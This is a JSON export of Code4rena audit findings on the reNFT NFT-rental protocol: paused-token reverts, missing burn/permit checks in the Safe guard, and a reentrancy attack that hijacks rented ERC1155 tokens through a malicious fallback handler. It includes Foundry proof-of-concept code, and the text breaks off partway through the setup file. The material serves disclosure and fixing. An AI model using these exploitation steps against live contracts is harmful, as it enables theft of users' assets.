{
  "tag": "ERC1155",
  "count": 17,
  "metadata": {
    "totalResults": 17,
    "totalPages": 1
  },
  "last_rateLimit": {
    "limit": 20,
    "remaining": 4,
    "reset": 1771761060
  },
  "findings": [
    {
      "id": "30539",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "1238",
      "title": "[M-12] paused ERC721/ERC1155 could cause stopRent to revert, potentially causing issues for the lender.",
      "content": "\nMany ERC721/ERC1155 tokens, including well-known games such as Axie Infinity, have a pause functionality inside the contract. This pause functionality will cause the `stopRent` call to always revert and could cause issues, especially for the `PAY` order type.\n\n### Proof of Concept\n\nWhen `stopRent` /`stopRentBatch` is called, it will eventually trigger `  _reclaimRentedItems ` and execute `reclaimRentalOrder` from the safe to send back tokens to lender.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L353> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166-L183>\n\n\n\n```solidity\n    function _reclaimRentedItems(RentalOrder memory order) internal {\n        // Transfer ERC721s from the renter back to lender.\n        bool success = ISafe(order.rentalWallet).execTransactionFromModule(\n            // Stop policy inherits the reclaimer package.\n            address(this),\n            // value.\n            0,\n            // The encoded call to the `reclaimRentalOrder` function.\n            abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),\n            // Safe must delegate call to the stop policy so that it is the msg.sender.\n            Enum.Operation.DelegateCall\n        );\n\n        // Assert that the transfer back to the lender was successful.\n        if (!success) {\n            revert Errors.StopPolicy_ReclaimFailed();\n        }\n    }\n```\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71-L101> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L32-L34> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L42-L50>\n\n```solidity\n    function reclaimRentalOrder(RentalOrder calldata rentalOrder) external {\n        // This contract address must be in the context of another address.\n        if (address(this) == original) {\n            revert Errors.ReclaimerPackage_OnlyDelegateCallAllowed();\n        }\n\n        // Only the rental wallet specified in the order can be the address that\n        // initates the reclaim. In the context of a delegate call, address(this)\n        // will be the safe.\n        if (address(this) != rentalOrder.rentalWallet) {\n            revert Errors.ReclaimerPackage_OnlyRentalSafeAllowed(\n                rentalOrder.rentalWallet\n            );\n        }\n\n        // Get a count for the number of items.\n        uint256 itemCount = rentalOrder.items.length;\n\n        // Transfer each item if it is a rented asset.\n        for (uint256 i = 0; i < itemCount; ++i) {\n            Item memory item = rentalOrder.items[i];\n\n            // Check if the item is an ERC721.\n            if (item.itemType == ItemType.ERC721)\n>>>             _transferERC721(item, rentalOrder.lender);\n\n            // check if the item is an ERC1155.\n            if (item.itemType == ItemType.ERC1155)\n>>>             _transferERC1155(item, rentalOrder.lender);\n        }\n    }\n```\n\nIt can be observed that AxieInfinity has paused functionality : <https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d>\n\nThis is problematic, especially for the `PAY` order type. Consider a scenario where the lender is not satisfied with how the renter utilizes their `PAY` order's NFTs. Now, when the lender wants to early stop the rent and calls `stopRent`, the call will revert, and the earning calculation for the renter will still be growing.\n\n### Recommended Mitigation Steps\n\nConsider decoupling the NFT claim from stopRent and introducing a timestamp tracker when the lender calls stopRent. Utilize that timestamp value when the rent stop is finalized and calculate the ERC20 reward for the renter.\n\n**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1908721888):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1921360740):**\n > In theory the protocol could mitigate this with a pull mechanism which could be executed after the unpause and allow the counterparty to be unaffected.  Currently this amounts to a temporary DOS and therefore seems like M is correct.  I think its an edge case, but its plausible as the warden has shown. \n\n _Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/220)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/64) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/59).\n\n***\n\n",
      "summary": "\nERC721/ERC1155 tokens, such as those used in popular games like Axie Infinity, have a feature called \"pause\" in their contracts. This pause feature can cause problems when using the `stopRent` function, especially for the `PAY` order type. A demonstration of this issue can be found in the code provided in the report. The team behind the protocol has acknowledged the issue and has taken steps to mitigate it by implementing a whitelist for tokens that can be used in the protocol. This has been confirmed as a successful mitigation by independent reviewers.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/220",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "m-12-paused-erc721erc1155-could-cause-stoprent-to-revert-potentially-causing-issues-for-the-lender-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "Grief Attack"
          }
        },
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "30535",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 23,
      "protocol_id": "1238",
      "title": "[M-08] Assets in a Safe can be lost",
      "content": "\nThe `Guard.sol` contract is enabled on Safe's and uses the [`_checkTransaction`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195-L293) function to ensure that transactions that the Safe executes do not transfer the asset out of the Safe.\n\nThe `checkTransaction` function achieves this by isolating the function selector and checking that it is not a disallowed function selector. For instance: `safeTransferFrom`, `transferFrom`, `approve`, `enableModule`, etc.\n\nThe list does not, however, check for calls to `burn` the token, neither does it check if it is a `permit`. The sponsor has noted the following:\n\n> The [Guard](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol) contract can only protect against the transfer of tokens that faithfully\nimplement the ERC721/ERC1155 spec.\n\nBut this does not acknowledge the fact that an ERC721/ERC1155 implementation can still be an honest implementation and have extra functionality. In particular, the `burn` function is a common addition to many ERC721 contracts, usually granted through inheriting `ERC721Burnable`.\n\nFor example, the following projects all have a `burn` function, and Safe's protected by `Guard.sol` that hold these NFTs will be vulnerable to loss of assets via a malicious renter:\n\n*   [Pudgy Penguins](https://etherscan.io/address/0xbd3531da5cf5857e7cfaa92426877b022e612cf8#writeContract)\n*   [Lil Pudgies](https://etherscan.io/address/0x524cab2ec69124574082676e6f654a18df49a048#writeContract)\n*   [Oh Ottie](https://etherscan.io/address/0x7ff5601b0a434b52345c57a01a28d63f3e892ac0#code#F3#L45)\n\nThese are three that are in the top 10 projects on Opensea at the time of writing.\n\n### Proof of Concept\n\nWe can see in the `Guard.sol` file that certain function selectors are imported to be tested against:\n\n    import {\n        shared_set_approval_for_all_selector,\n        e721_approve_selector,\n        e721_safe_transfer_from_1_selector,\n        e721_safe_transfer_from_2_selector,\n        e721_transfer_from_selector,\n        e721_approve_token_id_offset,\n        e721_safe_transfer_from_1_token_id_offset,\n        e721_safe_transfer_from_2_token_id_offset,\n        e721_transfer_from_token_id_offset,\n        e1155_safe_transfer_from_selector,\n        e1155_safe_batch_transfer_from_selector,\n        e1155_safe_transfer_from_token_id_offset,\n        e1155_safe_batch_transfer_from_token_id_offset,\n        gnosis_safe_set_guard_selector,\n        gnosis_safe_enable_module_selector,\n        gnosis_safe_disable_module_selector,\n        gnosis_safe_enable_module_offset,\n        gnosis_safe_disable_module_offset\n    } from \"@src/libraries/RentalConstants.sol\";\n\nFrom the `_checkTransaction` function we see that there is no check for `burn`, `burnFrom` or `permit`.\n\nA malicious renter who is renting the asset can still execute `burn` (common), `burnFrom` (rare) or `permit` (popularized by [Uni v3](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/ERC721Permit.sol#L52C9-L86)), which will lead to loss of the asset.\n\n### Coded PoC\n\nThe below test can be placed in the `CheckTransaction.t.sol` test file. It should be run with `forge test --match-test test_PoC -vvvv`\n\n        function test_PoC() public {\n            bytes4 burn_selector = 0x42966c68;\n            // Create a rentalId array\n            RentalAssetUpdate[] memory rentalAssets = new RentalAssetUpdate[](1);\n            rentalAssets[0] = RentalAssetUpdate(\n                RentalUtils.getItemPointer(address(alice.safe), address(erc721s[0]), 0),\n                1\n            );\n\n            // Mark the rental as actively rented in storage\n            _markRentalsAsActive(rentalAssets);\n\n            // Build up the `transferFrom(address from, address to, uint256 tokenId)` calldata\n            bytes memory burnCalldata = abi.encodeWithSelector(\n                burn_selector,\n                69\n            );\n\n            // Expect revert because of an unauthorized function selector\n            _checkTransactionRevertUnauthorizedSelector(\n                address(alice.safe),\n                address(erc721s[0]),\n                burn_selector,\n                burnCalldata\n            );\n        }\n\nThe console output is:\n\n    Encountered 1 failing test in test/unit/Guard/CheckTransaction.t.sol:Guard_CheckTransaction_Unit_Test\n    [FAIL. Reason: call did not revert as expected] test_PoC() (gas: 96093)\n\nThis shows that the `checkTransaction` would not protect against calls to `burn` the asset.\n\n### Recommended Mitigation Steps\n\nAlthough not a catch-all, adding checks for `burn`, `burnFrom` and `permit` functions (which are common in smart contracts) should prevent this in most cases.\n\nSelectors:\n\n*   `burn`: `0x42966c68`\n*   `burnFrom`: `0x1fe41211`\n*   `permit` : `0xabae8f0d`\n\nIn the `Guard.sol` file:\n\n<Details>\n\n```diff\n        } else if (selector == e1155_safe_transfer_from_selector) {\n            // Load the token ID from calldata.\n            uint256 tokenId = uint256(\n                _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)\n            );\n\n            // Check if the selector is allowed.\n            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == burn_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, burn_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == burn_From_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, burn_From_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == permit_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, permit_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } \n```\n</details>\n\n*Please note that there may be other flavours of the `permit` function that have different signatures.*\n\n**[141345 (Lookout) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1902725917):**\n > [Issue 587](https://github.com/code-423n4/2024-01-renft-findings/issues/587) has a detailed discussion about `permit()`.\n\n**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1908940377):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1912774849):**\n > Originally commented on https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065\n> \n> But same thing applies here, I don't think this can be called out of scope but do think M is more appropiate.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1915456905):**\n > Given the justification for #587, M severity seems fair.\n\n**[lokithe5th (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916119263):**\n > @0xean thank you for your judging efforts. \n> \n> As the author of this submission I would like to highlight a mistake in my report: the Safe itself will not be calling the `permit()` function, only signing a transaction that approves a `permit`. Adding a check for the `permit` selector will not be effective. \n> \n> I draw attention to this fact because I do not want the sponsor to believe they have guarded against the `permit` vulnerability by implementing the suggested fix, while they may still in fact be vulnerable to it.\n> \n> However, the PoC and the suggested fix remain valid for `burn` and `burnFrom` functions. \n> \n> Credit to issue #587 and @stalinMacias for pointing this nuance out.\n\n**[0xStalin (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916150182):**\n > Thanks @lokithe5th. \n> \n> I believe this issue is completely valid in regards to the `burn` functionality and is providing the right mitigation for it.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/5) - Added support for burnable ERC721 and ERC1155 tokens.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/53), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/55) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/14).\n\n***\n\n",
      "summary": "\nThe report discusses a vulnerability in the Guard.sol contract used on Safe's. The contract is responsible for ensuring that transactions do not transfer assets out of the Safe. However, the contract does not check for calls to the `burn` function or other functions such as `burnFrom` and `permit`, which can lead to loss of assets. The report provides a proof of concept and recommends adding checks for these functions to prevent the vulnerability. The sponsor has acknowledged the issue and plans to add a whitelist for tokens interacting with the protocol. The severity of the issue has been decreased to medium and the sponsor has implemented a fix.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/323",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "m-08-assets-in-a-safe-can-be-lost-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "30523",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "1238",
      "title": "[H-03] An attacker can hijack any ERC1155 token he rents due to a design issue in reNFT via reentrancy exploitation",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **Gnosis safe fallback handlers**: Safes starting with version 1.1.1 allow to specify a fallback handler. A gnosis safe fallback handler is a contract which handles all functions that is unknown to the safe, this feature is meant to provide a great flexibility for the safe user. The safe in particular says \"If I see something unknown, then I just let the fallback handler deal with it.\"\n\n    **Example**: If you want to take a uniswap flash loan using your gnosis safe, you'll have to create a fallback handler contract with the callback function `uniswapV2Call()`. When you decide to take a flash loan using your safe, you'll send a call to `swap()` in the uniswap contract. The uniswap contract will then reach out to your safe contract asking to call `uniswapV2Call()`, but `uniswapV2Call()` isn't actually implemented in the safe contract itself, so your safe will reach out to the fallback handler you created, set as the safe's fallback handler and ask it to handle the `uniswapV2Call()` TX coming from uniswap.\n\n    **Setting a fallback handler**: To set a fallback handler for your safe, you'll have to call the function [`setFallbackHandler()`](https://github.com/safe-global/safe-contracts/blob/b140318af6581e499506b11128a892e3f7a52aeb/contracts/base/FallbackManager.sol#L44) which you can find it's logic in [FallbackManager.sol](https://github.com/safe-global/safe-contracts/blob/main/contracts/base/FallbackManager.sol)\n\n***\n\n### The Vulnerability\n\n***\n\nIn order to make sense of the vulnerability, we need to understand the token transferral & rental registeration execution flow first.\n\n**Step 1**: First of all, before the fulfillment process begins, both the lender and the borrower need to approve the Seaport Conduit to spend their tokens on behalf of them. The lender approves the conduit to spend the NFT token which he wants to lend (offer item) and the borrower approves the ERC20 tokens he will use as a payment method for this rental (consideration item).\n\n**Step 2**: Once the fulfillment process begins, the conduit begins the token transferral process. The conduit transfers the lender's NFT tokens to the borrower's gnosis rental safe, then it transfers the borrower's ERC20 tokens to the Payment Escrow.\n\n*Note 1: Keep in mind that the rental is not registered yet.*.\n\n*Note 2: The Seaport Conduit utilizes the `safeTransferFrom` function to transfer the ERC1155 tokens which will trigger `onERC1155Receive` hook on the receiver of the ERC1155 tokens, in this case, it's the borrower's rental safe. However, when it comes to the transferral of ERC721 tokens, it uses `transferFrom` and not `safeTransferFrom`*.\n\n**Step 3**: Once the tokens are transferred, Seaport will communicate with the Zone contract. You can think of the zone contract as a contract holding a callback function which is called after all the swaps are made. The contract which will be holding the callback function to be executed by Seaport is [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) and the callback function it is holding, which as I mentioned, will be called by Seaport, is [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27).\n\n**Step 4**: Once the [validateOrder()](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L733C14-L733C27) function is called, the rental registeration process will kick in. A series of internal functions will be called inside [Create.sol](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol) which will verify the signatures of the order data it has received from seaport and then the internal function [\\_rentFromZone](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L530) will be called and this internal function will actually register the rental. It'll communicate with the [`Storage`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/Storage.sol) module which holds all the rental data and ask it to [add the rental](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L595).\n\n**Step 5**: The rental is finally added.\n\nHere is the full execution flow.\n\n*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588).*\n\n***\n\n### The vulnerability\n\n***\n\nThe main vulnerability exists within the fact that reNFT does not register the rental except after swapping the tokens, in addition to `safeTransferFrom()` being used to transfer ERC1155 tokens, which would of course, trigger the callback function `onERC1155Receive()` on the borrower's safe.\n\nThe combination of those two factors allow for the exploitation of a reentrancy vulnerability allowing an attacker to hijack ANY ERC1155 tokens he rents.\n\n### Steps of exploitation\n\n***\n\n1.  The attacker will create a custom fallback handler contract which will contain an implementation of the `onERC1155Receive()` function, which will be triggered by the Seaport Conduit when it conducts the token swap and moves the lender's NFT tokens to the borrower's safe. The implementation of the `onERC1155Receive()` function will simply instruct the gnosis safe to transfer the tokens to the attacker's address.\n\n    **Since the rental is not yet registered, the guard will let the transferral occur normally**\n\n2.  The attacker will create the rental safe which he'll utilize to hijack the target ERC1155 token.\n\n3.  The attacker will set the fallback handler address of his safe to be the address of the custom fallback handler contract he created.\n\n4.  The attacker will initiate the rental process\n\n5.  When the conduit transfers the lender's ERC1155 token to the attacker's safe using `safeTransferFrom`. It'll request to call `onERC1155Receive()` on the attacker's safe, but the `onERC1155Receive()` callback function isn't implemented by default in the safe contract, so the safe contract will rely on the custom fallback handler (which the attacker set) and the `onERC1155Receive()` function in the fallback handler will be executed.\n\n6.  When the `onERC1155Receive()` callback is executed in the custom fallback handler contract, the fallback handler will instruct gnosis to move the ERC1155 token rented to the attacker's address. The gnosis guard will be disarmed and will allow the transferral to occur normally because it isn't aware of the rental at this point.\n\n7.  The ERC1155 token will be hijacked successfully.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_ERC1155_Exploit -vvv`\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    